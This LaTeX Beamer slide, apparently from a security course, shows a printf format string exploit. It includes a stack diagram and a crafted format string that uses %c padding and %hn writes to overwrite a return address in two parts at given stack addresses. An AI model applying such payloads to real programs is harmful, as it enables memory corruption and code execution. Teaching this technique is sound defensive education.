
\usetikzlibrary{matrix}

\begin{frame}{format string exploit}
    \begin{itemize}
    \item what if number is too big? write in pieces, example:
        \begin{itemize}
        \item 0x0040 (byte 2-3, first written), 0x1156 (byte 0-1, second written)
        \end{itemize}
    \end{itemize}
\begin{tikzpicture}
\matrix[tight matrix,nodes={style={text width=7cm,minimum height=.6cm,font=\small}}] (stack) {
    printf return address \\
    \myemph<4>{printf argument 7}/buffer start \& \tt "\%c\%c\%c\%c" \\
    \myemph<4>{printf argument 8} \& \tt "\%c\myemph<4>{\%c\%c\%c}" \\
    \myemph<4>{printf argument 9} \& \tt "\myemph<4>{\%c\%.55u}\myemph<5>{\%}" \\
    \myemph<4>{printf argument 10} \& \tt "\myemph<5>{hn}\myemph<6>{\%.4374}" \\
    \myemph<4>{printf argument 11} \& \tt "\myemph<6>{u}\myemph<7>{\%hn}...." \\
    \myemph<5>{printf argument 12} \& target byte 2 \tt 0x7fffffffecfa \\
    \myemph<6>{printf argument 13} \& for \%u \\
    \myemph<5>{printf argument 14} \& target byte 0 \tt 0x7fffffffecf8 \\
    \ldots \& \ldots \\
};
\end{tikzpicture}
\end{frame}
